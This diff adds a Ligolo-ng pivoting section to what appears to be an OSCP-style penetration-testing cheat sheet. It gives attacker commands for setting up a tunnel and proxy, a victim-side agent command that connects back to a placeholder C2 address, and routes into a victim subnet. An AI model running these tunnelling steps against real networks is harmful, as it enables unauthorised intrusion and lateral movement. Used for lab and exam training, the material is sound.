@@ -1366,6 +1366,49 @@ john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
 ```
 
 # Port Forwarding & SSH Tunneling
+
+## Ligolo-ng
+
+[Guide](https://www.hackingarticles.in/a-detailed-guide-on-ligolo-ng/)
+
+> Download proxy and agent files appropriate for C2 and victim OS's.   Extract & get agent binary on victim.
+
+##### Attacker setup
+```bash
+# Setup proxy
+ip tuntap add user [USER] mode tun ligolo
+ip link set ligolo up
+
+# Start ligolo proxy
+sudo ./proxy -selfcert -laddr [tun0_IP]:[PORT]
+	# sudo will allow the `start` use of the ligolo tunnel.  Will error out w/o sudo.
+	# When using w/ OSCP's VPN, you'll want the tun0 interface IP addy.  Otherwise, can either use 0.0.0.0:PORT OR leave -laddr out for self-assigned port
+```
+
+##### Victim setup
+```powershell
+# After starting ligolo proxy on C2
+.\agent.exe -connect [C2_IP]:[PORT] -ignore-cert
+```
+
+##### Attacker wrap-up
+```bash
+# In logolo, once agent has joined
+session
+	# Specify which session or hit enter if only 1
+
+# In new kali tab, set up routing info
+ip route add [Victim_Subnet]/24 dev ligolo
+	# ex:  `ip route add 172.16.155.0/24 dev ligolo`
+
+ip route list
+	# Should see something like `172.16.155.0/24 dev ligolo scope link linkdown`
+
+# In logolo, start tunnel
+start
+```
+
+
 ## nc
 
 ##### Relay
